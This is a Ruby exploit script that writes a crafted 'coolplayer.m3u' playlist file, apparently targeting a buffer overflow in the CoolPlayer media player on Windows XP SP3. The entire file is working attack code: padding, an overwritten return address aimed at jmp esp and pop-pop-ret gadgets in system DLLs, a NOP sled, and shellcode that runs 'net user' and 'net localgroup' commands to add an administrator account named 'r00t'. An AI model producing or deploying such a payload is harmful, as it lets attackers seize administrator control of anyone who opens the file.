#!/usr/bin/env ruby

buffsize = 10000

junk = "\x4A" * 218 # or 254 or 260, the junk simulate unsable address containing letter J
#eip = "\x42" * 4
eip = "\x61\x49\x92\x7C" # Memoru address 0x7C924961 -> pop edi, pop esi, pop ebp, ret
junk2 = "\x4A" * 12 # the junk simulate unsable address containing letter J
unsable_address = "\x7B\x46\x86\x7C" # Memory address 0x7C86467B jmp esp - Kernel32.dll
nops = "\x90" * 20

# XP SP3 add admin user shellcode -- 107 bytes
shell = "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23" +
"\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca" +
"\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63" +
"\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20" +
"\x6e\x65\x74\x20\x75\x73\x65\x72\x20" +
"\x72\x30\x30\x74\x20" + # user: r00t
"\x70\x77\x6e\x64" + # pass: pwnd
"\x20\x2f\x61\x64\x64\x20\x26\x26\x20\x6e" +
"\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72" +
"\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69" +
"\x73\x74\x72\x61\x74\x6f\x72\x73\x20" +
"\x72\x30\x30\x74" +
"\x20\x2f\x61\x64\x64\x00"
sploit = junk + eip + junk2 + unsable_address + nops + shell
fill = "\x43" * (buffsize - sploit.size)
buffer = sploit + fill

file = "coolplayer.m3u"
File.open(file, 'w') {|f| f.write(buffer)}
puts "Exploit file is #{file}"
puts "Buffer size is: #{buffer.size}"